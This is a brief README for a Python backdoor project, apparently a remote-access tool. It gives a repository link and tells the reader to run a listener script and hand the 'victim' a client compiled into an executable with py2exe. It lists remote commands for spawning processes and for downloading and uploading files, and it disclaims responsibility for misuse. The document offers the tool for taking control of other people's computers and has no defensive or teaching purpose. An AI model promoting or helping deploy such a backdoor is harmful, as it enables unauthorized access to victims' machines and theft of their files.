## Installation

```
https://github.com/w0rmkit/backdoor-with-python.git
```

## Usage


```
python console.py host port(default:8888)
```


```
python client.py
```

client.py is your victim and you take connection with console.py. I dont take any responsibility what youre going to do with this code.
Use py2exe to client.py to make it exe software. This is pretty easy script to use. Just run client.py and connect with console.py.

##Commands

:newprocess
:download
:upload

Maybe some new features someday if I have motivate to come back to this script.
